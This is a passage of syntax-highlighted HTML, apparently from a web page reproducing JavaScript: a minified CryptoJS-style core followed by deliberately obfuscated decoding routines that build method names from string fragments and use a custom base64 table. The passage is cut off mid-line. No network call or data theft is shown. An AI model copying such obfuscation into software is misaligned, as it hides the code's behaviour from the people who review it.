coypJsDk || <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">      , n = r.<span class="property">lib</span> = &#123;&#125;</span><br><span class="line">      , i = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">      , o = n.<span class="property">Base</span> = &#123;</span><br><span class="line">        <span class="attr">extend</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            i.<span class="property"><span class="keyword">prototype</span></span> = <span class="variable language_">this</span>;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="keyword">new</span> i;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; t.<span class="title function_">mixIn</span>(e),</span><br><span class="line">            t.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;init&quot;</span>) || (t.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                t.<span class="property">$super</span>.<span class="property">init</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            ),</span><br><span class="line">            t.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span> = t,</span><br><span class="line">            t.<span class="property">$super</span> = <span class="variable language_">this</span>,</span><br><span class="line">            t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">create</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="title function_">extend</span>();</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">init</span>.<span class="title function_">apply</span>(e, <span class="variable language_">arguments</span>),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">        <span class="attr">mixIn</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t <span class="keyword">in</span> e)</span><br><span class="line">                e.<span class="title function_">hasOwnProperty</span>(t) &amp;&amp; (<span class="variable language_">this</span>[t] = e[t]);</span><br><span class="line">            e.<span class="title function_">hasOwnProperty</span>(<span class="string">&quot;toString&quot;</span>) &amp;&amp; (<span class="variable language_">this</span>.<span class="property">toString</span> = e.<span class="property">toString</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">init</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">extend</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , a = n.<span class="property">WordArray</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, r</span>) &#123;</span><br><span class="line">            e = <span class="variable language_">this</span>.<span class="property">words</span> = e || [],</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">sigBytes</span> = r != t ? r : <span class="number">4</span> * e.<span class="property">length</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">toString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (e || c).<span class="title function_">stringify</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">concat</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">              , r = e.<span class="property">words</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">if</span> (e = e.<span class="property">sigBytes</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">clamp</span>(),</span><br><span class="line">            n % <span class="number">4</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; e &gt; i; i++)</span><br><span class="line">                    t[n + i &gt;&gt;&gt; <span class="number">2</span>] |= (r[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (i % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * ((n + i) % <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">65535</span> &lt; r.<span class="property">length</span>)</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; e &gt; i; i += <span class="number">4</span>)</span><br><span class="line">                    t[n + i &gt;&gt;&gt; <span class="number">2</span>] = r[i &gt;&gt;&gt; <span class="number">2</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                t.<span class="property">push</span>.<span class="title function_">apply</span>(t, r);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">sigBytes</span> += e,</span><br><span class="line">            <span class="variable language_">this</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clamp</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">words</span></span><br><span class="line">              , r = <span class="variable language_">this</span>.<span class="property">sigBytes</span>;</span><br><span class="line">            t[r &gt;&gt;&gt; <span class="number">2</span>] &amp;= <span class="number">4294967295</span> &lt;&lt; <span class="number">32</span> - <span class="number">8</span> * (r % <span class="number">4</span>),</span><br><span class="line">            t.<span class="property">length</span> = e.<span class="title function_">ceil</span>(r / <span class="number">4</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">words</span> = <span class="variable language_">this</span>.<span class="property">words</span>.<span class="title function_">slice</span>(<span class="number">0</span>),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">random</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; t &gt; n; n += <span class="number">4</span>)</span><br><span class="line">                r.<span class="title function_">push</span>(<span class="number">4294967296</span> * e.<span class="title function_">random</span>() | <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , s = r.<span class="property">enc</span> = &#123;&#125;</span><br><span class="line">      , c = s.<span class="property">Hex</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            e = e.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; e &gt; n; n++) &#123;</span><br><span class="line">                <span class="keyword">var</span> i = t[n &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>) &amp; <span class="number">255</span>;</span><br><span class="line">                r.<span class="title function_">push</span>((i &gt;&gt;&gt; <span class="number">4</span>).<span class="title function_">toString</span>(<span class="number">16</span>)),</span><br><span class="line">                r.<span class="title function_">push</span>((<span class="number">15</span> &amp; i).<span class="title function_">toString</span>(<span class="number">16</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">length</span>, r = [], n = <span class="number">0</span>; t &gt; n; n += <span class="number">2</span>)</span><br><span class="line">                r[n &gt;&gt;&gt; <span class="number">3</span>] |= <span class="built_in">parseInt</span>(e.<span class="title function_">substr</span>(n, <span class="number">2</span>), <span class="number">16</span>) &lt;&lt; <span class="number">24</span> - <span class="number">4</span> * (n % <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t / <span class="number">2</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , l = s.<span class="property">Latin1</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            e = e.<span class="property">sigBytes</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = [], n = <span class="number">0</span>; e &gt; n; n++)</span><br><span class="line">                r.<span class="title function_">push</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(t[n &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>) &amp; <span class="number">255</span>));</span><br><span class="line">            <span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">length</span>, r = [], n = <span class="number">0</span>; t &gt; n; n++)</span><br><span class="line">                r[n &gt;&gt;&gt; <span class="number">2</span>] |= (<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(n)) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * (n % <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(r,t)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , h = s.<span class="property">Utf8</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(<span class="built_in">escape</span>(l.<span class="title function_">stringify</span>(e)))</span><br><span class="line">            &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="title class_">Error</span>(<span class="string">&quot;Malformed UTF-8 data&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l.<span class="title function_">parse</span>(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(e)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , u = n.<span class="property">BufferedBlockAlgorithm</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_data</span> = <span class="keyword">new</span> a.<span class="property">init</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> = <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_append</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; (e = h.<span class="title function_">parse</span>(e)),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">concat</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_nDataBytes</span> += e.<span class="property">sigBytes</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_process</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">              , n = r.<span class="property">words</span></span><br><span class="line">              , i = r.<span class="property">sigBytes</span></span><br><span class="line">              , o = <span class="variable language_">this</span>.<span class="property">blockSize</span></span><br><span class="line">              , s = i / (<span class="number">4</span> * o)</span><br><span class="line">              , s = t ? e.<span class="title function_">ceil</span>(s) : e.<span class="title function_">max</span>((<span class="number">0</span> | s) - <span class="variable language_">this</span>.<span class="property">_minBufferSize</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (t = s * o,</span><br><span class="line">            i = e.<span class="title function_">min</span>(<span class="number">4</span> * t, i),</span><br><span class="line">            t) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; t &gt; c; c += o)</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">_doProcessBlock</span>(n, c);</span><br><span class="line">                c = n.<span class="title function_">splice</span>(<span class="number">0</span>, t),</span><br><span class="line">                r.<span class="property">sigBytes</span> -= i</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> a.<span class="title function_">init</span>(c,i)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = o.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">_data</span> = <span class="variable language_">this</span>.<span class="property">_data</span>.<span class="title function_">clone</span>(),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_minBufferSize</span>: <span class="number">0</span></span><br><span class="line">    &#125;);</span><br><span class="line">    n.<span class="property">Hasher</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: o.<span class="title function_">extend</span>(),</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            u.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doReset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">update</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">            <span class="variable language_">this</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">finalize</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doFinalize</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="attr">_createHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">t, r</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> e.<span class="title function_">init</span>(r).<span class="title function_">finalize</span>(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_createHmacHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">t, r</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> p.<span class="property">HMAC</span>.<span class="title function_">init</span>(e,r).<span class="title function_">finalize</span>(t)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> p = r.<span class="property">algo</span> = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;(<span class="title class_">Math</span>)</span><br><span class="line">  , process = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = -<span class="number">979402</span></span><br><span class="line">      , r = <span class="number">979402</span>;</span><br><span class="line">    _nuz = -<span class="number">705100</span>,</span><br><span class="line">    _nux = <span class="number">705102</span>,</span><br><span class="line">    _mlq = <span class="number">1</span>,</span><br><span class="line">    _zmmn = -<span class="number">1</span>,</span><br><span class="line">    _xhce = <span class="number">664917</span>,</span><br><span class="line">    _pvaa = -<span class="number">713216</span>,</span><br><span class="line">    _tmlq = <span class="number">713456</span>,</span><br><span class="line">    _bbm = <span class="number">933985</span>,</span><br><span class="line">    _lxz = <span class="number">33853</span>,</span><br><span class="line">    _sbx = -<span class="number">93056</span>,</span><br><span class="line">    _nnuy = <span class="string">&quot;lit&quot;</span>,</span><br><span class="line">    _uuz = <span class="string">&quot;map&quot;</span>,</span><br><span class="line">    _jggu = <span class="string">&quot;it&quot;</span>,</span><br><span class="line">    _yyf = <span class="string">&quot;function&quot;</span>,</span><br><span class="line">    _oos = <span class="string">&quot;_&quot;</span>,</span><br><span class="line">    _hsvuz = <span class="string">&quot;sub&quot;</span>,</span><br><span class="line">    _isus = <span class="string">&quot;cha&quot;</span>,</span><br><span class="line">    _paww = <span class="string">&quot;str&quot;</span>,</span><br><span class="line">    _lyydw = <span class="string">&quot;sp&quot;</span>,</span><br><span class="line">    _qndkq = <span class="string">&quot;cha&quot;</span>,</span><br><span class="line">    _muzz = <span class="string">&quot;spl&quot;</span>,</span><br><span class="line">    _unny = <span class="string">&quot;base&quot;</span>,</span><br><span class="line">    _heeqc = <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">var</span> n = &#123;</span><br><span class="line">        <span class="attr">_base</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">_baseTable</span>: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">        <span class="attr">_baseTables</span>: [-<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">62</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>],</span><br><span class="line">        <span class="attr">_baseLink</span>: <span class="string">&quot;120112130113220101010101011201011201121313220101&quot;</span>,</span><br><span class="line">        <span class="attr">_basefunction</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (e = <span class="number">2</span> * e,</span><br><span class="line">            str_1 = <span class="variable language_">this</span>.<span class="property">_baseLink</span>[e],</span><br><span class="line">            str_2 = <span class="variable language_">this</span>.<span class="property">_baseLink</span>[e + <span class="number">1</span>],</span><br><span class="line">            result = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            result = t.<span class="title function_">substring</span>(<span class="number">0</span>, str_2),</span><br><span class="line">            <span class="built_in">parseInt</span>(str_1)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="attr">_mlq</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += <span class="variable language_">this</span>.<span class="property">_baseTables</span>[result];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> _mlq + <span class="attr">_zmmn</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += <span class="variable language_">this</span>.<span class="property">_baseTable</span>[result];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="attr">default</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += result</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> t.<span class="title function_">substring</span>(<span class="variable language_">this</span>.<span class="property">_baseLink</span>[e + <span class="number">1</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    n.<span class="property">_baseLink</span> = n.<span class="property">_baseLink</span>[_lyydw + _nnuy](<span class="string">&quot;&quot;</span>),</span><br><span class="line">    n.<span class="property">_baseTable</span> = n.<span class="property">_baseTable</span>[_muzz + _jggu](<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = t + r; i &lt; n.<span class="property">_baseLink</span>.<span class="property">length</span> / (_nux + _nuz); i++)</span><br><span class="line">        e = n.<span class="title function_">_basefunction</span>(i, e);</span><br><span class="line">    <span class="keyword">return</span> n.<span class="property">_base</span></span><br><span class="line">&#125;;</span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    _hqjl = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="string">&quot;rAt&quot;</span></span><br><span class="line">          , t = <span class="string">&quot;rAt&quot;</span></span><br><span class="line">          , r = <span class="string">&quot;gth&quot;</span></span><br><span class="line">          , n = <span class="string">&quot;len&quot;</span></span><br><span class="line">          , i = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , o = <span class="string">&quot;sub&quot;</span></span><br><span class="line">          , a = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , s = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , c = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , l = <span class="string">&quot;sub&quot;</span></span><br><span class="line">          , h = <span class="string">&quot;gth&quot;</span></span><br><span class="line">          , u = <span class="string">&quot;in&quot;</span></span><br><span class="line">          , p = <span class="string">&quot;erse&quot;</span></span><br><span class="line">          , f = <span class="string">&quot;rev&quot;</span></span><br><span class="line">          , d = <span class="string">&quot;lit&quot;</span></span><br><span class="line">          , _ = <span class="string">&quot;sp&quot;</span></span><br><span class="line">          , y = <span class="string">&quot;gth&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> _nus = -<span class="number">705100</span>,</span><br><span class="line">        _cac = <span class="number">705102</span>,</span><br><span class="line">        _lqo = <span class="number">121771</span>,</span><br><span class="line">        _sycv = -<span class="number">447488</span>,</span><br><span class="line">        _ptm = <span class="number">834104</span>,</span><br><span class="line">        _qkta = -<span class="number">834104</span>,</span><br><span class="line">        _csr = <span class="number">671648</span>,</span><br><span class="line">        _kiq = -<span class="number">671646</span>,</span><br><span class="line">        _dwuh = -<span class="number">79794</span>,</span><br><span class="line">        _wrp = <span class="number">518838</span>,</span><br><span class="line">        _thb = <span class="number">716406</span>,</span><br><span class="line">        _qax = -<span class="number">716405</span>,</span><br><span class="line">        _bgi = <span class="number">979402</span>,</span><br><span class="line">        _tts = -<span class="number">979402</span>,</span><br><span class="line">        _vwjb = <span class="number">715885</span>,</span><br><span class="line">        _ebah = <span class="number">607613</span>,</span><br><span class="line">        _hppv = <span class="title class_">Object</span>(),</span><br><span class="line">        <span class="keyword">function</span>(<span class="params">g, v, m</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> k, w, b, S, B, x, C, A = <span class="string">&quot;str&quot;</span>, D = <span class="string">&quot;sub&quot;</span>, R = <span class="string">&quot;cha&quot;</span>, z = <span 